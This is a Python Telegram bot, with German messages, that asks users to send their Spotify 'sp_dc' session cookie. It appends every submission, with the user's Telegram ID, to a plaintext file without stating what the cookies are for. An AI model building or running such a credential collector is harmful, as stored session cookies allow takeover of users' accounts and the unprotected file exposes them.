import os
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    await update.message.reply_text(
        f"Hallo {user_name}!\n\n"
        "Schicke mir einfach deinen Spotify `sp_dc` Cookie als Textnachricht. "
        "Ich speichere ihn für dich ab."
    )

async def handle_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    # Plausibilitätsprüfung (sp_dc Cookies sind sehr lang)
    if len(text) > 40:
        # Speichert die Cookies lokal in einer Datei
        with open("user_cookies.txt", "a") as f:
            f.write(f"User: {user_id} | Cookie: {text}\n")
            
        await update.message.reply_text("✅ Cookie erfolgreich empfangen und gespeichert!")
    else:
        await update.message.reply_text("❌ Das sieht nicht nach einem gültigen `sp_dc` Cookie aus. Bitte überprüfe deine Eingabe.")

if __name__ == '__main__':
    if not BOT_TOKEN:
        print("FEHLER: Kein TELEGRAM_TOKEN gesetzt!")
        exit(1)
        
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie))
    
    print("Bot wird gestartet...")
    app.run_polling()
